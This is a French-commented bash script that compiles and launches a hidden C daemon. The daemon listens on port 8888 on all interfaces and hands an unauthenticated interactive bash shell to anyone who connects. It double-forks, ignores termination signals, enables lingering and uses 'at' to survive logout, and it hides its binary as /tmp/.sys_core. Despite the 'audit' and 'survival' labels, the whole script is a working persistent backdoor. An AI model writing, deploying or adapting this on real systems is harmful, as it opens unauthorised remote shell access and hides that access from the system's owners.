#!/bin/bash

# --- [ CONFIGURATION ] ---
PORT_SURVIVAL=8888
LIB_PATH="/tmp/libghost.so"
W_DIR="/tmp/.system_backup_$(whoami)"

# --- [ PHASE 1 : DAEMON C ROBUSTE ] ---
# On crée un binaire indépendant qui ignore SIGHUP et SIGTERM
generate_daemon() {
    cat << 'EOF' > /tmp/survival_daemon.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>

void pwn() {
    int s_fd, c_fd;
    struct sockaddr_in addr;
    int opt = 1;
    s_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(s_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(8888);
    bind(s_fd, (struct sockaddr *)&addr, sizeof(addr));
    listen(s_fd, 5);
    while (1) {
        c_fd = accept(s_fd, NULL, NULL);
        if (fork() == 0) {
            dup2(c_fd, 0); dup2(c_fd, 1); dup2(c_fd, 2);
            execl("/bin/bash", "bash", "--noprofile", "--norc", "-i", NULL);
        }
        close(c_fd);
    }
}

int main() {
    // Double fork pour devenir orphelin d'init (PID 1)
    if (fork() != 0) exit(0);
    setsid();
    if (fork() != 0) exit(0);

    // Ignorer les signaux de terminaison de session
    signal(SIGHUP, SIG_IGN);
    signal(SIGTERM, SIG_IGN);

    // Fermeture propre des FDs pour éviter le lien avec le TTY
    for (int i = 0; i < 32; i++) close(i);

    pwn();
    return 0;
}
EOF
    gcc /tmp/survival_daemon.c -o /tmp/.sys_core 2>/dev/null
    rm /tmp/survival_daemon.c
}

# --- [ PHASE 2 : DÉPLOIEMENT ] ---
start_audit() {
    echo "[*] Préparation du démon de survie..."
    generate_daemon
    
    # Activation du linger au cas où
    loginctl enable-linger $(whoami) 2>/dev/null

    # Lancement via 'at' (si dispo) pour détacher du cgroup session
    if command -v at >/dev/null 2>&1; then
        echo "/tmp/.sys_core" | at now + 1 minute >/dev/null 2>&1
        echo "[+] Lancé via 'at' (détachement total)."
    else
        # Sinon, lancement direct avec setsid et redirection totale
        setsid /tmp/.sys_core >/dev/null 2>&1 &
        echo "[+] Lancé via setsid."
    fi

    echo "---------------------------------------------------------------"
    echo "[OK] INFRASTRUCTURE DE SURVIE DÉPLOYÉE"
    echo "1. Port de secours : nc localhost $PORT_SURVIVAL"
    echo "2. Résilience      : Survit au logout (Double-Fork + SIG_IGN)"
    echo "---------------------------------------------------------------"
}

stop_audit() {
    pkill -9 -f ".sys_core"
    rm -f /tmp/.sys_core
    echo "[OK] Système nettoyé."
}

case "$1" in
    start) start_audit ;;
    stop)  stop_audit ;;
    *) echo "Usage: $0 {start|stop}" ;;
esac
